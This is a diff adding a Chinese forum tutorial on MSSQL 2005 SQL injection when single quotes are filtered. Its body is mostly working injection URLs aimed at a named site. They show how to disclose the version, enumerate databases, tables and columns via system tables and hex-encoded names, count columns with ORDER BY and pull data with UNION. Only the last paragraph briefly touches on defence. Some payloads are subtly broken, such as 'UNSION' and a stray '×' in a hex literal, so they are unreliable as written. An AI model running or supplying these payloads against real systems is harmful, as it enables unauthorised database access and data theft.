@@ -1,0 +1,84 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+绕过单引号继续注入
+D8888D主贴内容-------------------------------------------------------
+Web应用程序一般都会使用数据库来保存各种信息，比如电子商务网站的帐户信息、销售商品的价格，订单、支付细节、和各种不同的权限数值等。数据库中的信息的读取、更新、增加或者删除等都是通过SQL来实现的，因此，在数据交互的环节没有安全过滤净化，则可能易于受到SQL注入攻击，严重的可能导致数据库非法操作，但是随着时间的推移，Web应用程序的开发者安全意识的日渐增强，SQL注入漏洞已经呈下降消失状态，但是之前的Web程序在被动防范 SQL攻击时，还是略显乏力，或者说是考虑不太周全。比如说普遍使用的过滤关键字的方法，如果仅仅过滤单引号或者小写类的关键字，则极易出现绕过的情形，而国内的安全公司相继推出的硬件WAF是否会存在同样的问题呢？从根本上说硬件WAF基于访问请求流量来鉴别攻击行为，可能在以后的攻防对立的演化过程也会慢慢有爆出被绕过的问题，所有的问题依然存在。本文试着在注入的SQL语句中不引用单引号，来和大家讨论一下注入攻击的部分原理和技巧。在一次测试中，发现一注入点过滤了单引号和小写的关键字，提交语句如下：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url]′ AND 1=(SELECT @@VERSION)—
+
+去掉单引号再次提交：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 1=(SELECT @@VERSION)—
+
+成功爆出数据库的系统版本了，说明在处理数据提交时，网站即使过滤了单引号了，依然可以注入。以下将和大家讨论获取数据库名、获取表名、获取列名、获取值等内容的部分SQL语句。在Mssql2005的master.dbo.sysdatabases表中存放着SQLSERVER数据库系统中的所有的数据库信息，仅需要PUBLIC权限就可以进行select操作：
+
+use master;
+
+SELECT * FROM MASTER.DBO.SYSDATABASES
+
+一至四，都是系统自带的数据库名，所以可以通过dbid这个查询变量来一一进行爆出数据库名，提交查询语句：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 1 IN (SELECT NAME FROM MASTER.DBO.SYSDATABASES WHERE DBID=3)
+
+查询语句通过dbid取值从1至到无法爆出数据库名为至。
+
+在Mssql2005版本里每个数据库都有一个用来存放表名信息的表，其权限同样仅public权限就能查询了,表名为：INFORMATION_SCHEMA.TABLES。
+
+use master ;
+
+select * from INFORMATION_SCHEMA.TABLES;
+
+表名就存储在TABLE_NAME列里，通过使用条件查询语句限制型“Top 1”，一条条纪录爆出表名来。
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 1 IN (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES)
+
+其为爆出的第一条纪录。如想爆出第一条记录，即可以使用sql语法的条件语句“where table_name !=0x已经爆出表名的十六进制”来取内容。先取已爆表名的十六进制。
+
+再提交语句如下：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 1 IN (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME!=0x41006400760065007200740069007A0065007200)
+
+成功爆出第二个表名，剩下的以此类推。当然读取数据库的INFORMATION_SCHEMA.TABLES表内容，只是当前数据库的表名，如果要读取整个数据库的表名，可以读sysobjects表的name列名，原理同上。
+
+在获取表名，得到列名是注入的下一个关键问题，在MSSQL 2005的数据库里，有张表名sys.all_objects里存放着表与列的信息，其表的列名object_id里存放着一个数值，对应着另一表名 sys.all_columns里的列名ID,而sys.all_columns表里存放着列的信息。执行：
+
+Select * from sys.all_objects
+
+由上图可知，列名name和列名object_id是有对应的。在注入时，可以通过指定name值来指定爆表的object_id的值。提交：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 999999< (SELECT TOP 1 CAST([OBJECT_ID] AS NVARCHAR(20)) FROM SYS.ALL_OBJECTS WHERE43006C00690063006B0049005000)—
+
+以上语句是无法直接爆出数值来的，但是可以用折半法来进行猜解，由于其数值都在10位以上，所以，其法也不太可能，但是可以联合两张表来直接查询。再次提交：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 9 in (SELECT B.NAME FROM SYSOBJECTS A,SYSCOLUMNS B WHERE A.ID=B.ID AND A.NAME=0x43006C00690063006B0049005000)—
+
+
+
+已经爆出表名0x43006C00690063006B0049005000的第一个列名ID了，可以加入条件”and B.NAMe != 0x已经爆出的列名”， 类推可以依次爆出。
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 9 in (SELECT B.NAME FROM SYSOBJECTS A,SYSCOLUMNS B WHERE A.ID=B.ID AND A.NAME=0x43006C00690063006B0049005000 AND B.NAME!=0×49004400)—
+
+在获取了表名和列名之后，获取其值也是很简单的。比较常用的有比如这样的获取值的：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 77= (SELECT ascii(@@VERSION))
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] AND 1=2 UNSION SELECT 1,2,3..@@VERSION–…
+
+一种是爆错对比，一种是union操作。第一种是基于查询后值的对比，而union操作是将执行返回的结果直接在浏览器显示，从而避免繁琐的折半猜测，在使用union操作时，前提则是前后查询的两种结果的结构相同，即是列名数相同，可以通过“order by 列名数“来鉴别。
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] order by 1—
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] order by 2
+
+…
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] Order by 8—
+
+此时，返回错误页面，即说明列名数是8，执行语句：
+
+[url=http://www.nuanyue.com/Test.asp?id=28]链接标记http://www.nuanyue.com/Test.asp?id=28[/url] and 1=2 Unsion select 1,2,3,4,5,6,7,8—
+
+来取出纪录。
+
+防范SQL注入攻击，尽管不同的数据库也会有不同的攻击技巧，复杂程序也各不相同，而许多SQL注入防范措施仅仅从某一处着手或者部分有效，从一个安全整体的角度立体的防护或许是值得借鉴的方法，比如从代码逻辑层、数据库层、网络层、系统层等，从本文阐述的原理来看，下次针对数据库的安全加固，你是否会调整一下“SYSOBJECTS、SYSCOLUMNS”等对象的权限呢？好像数据库批量挂马也有用到这两个表哦！
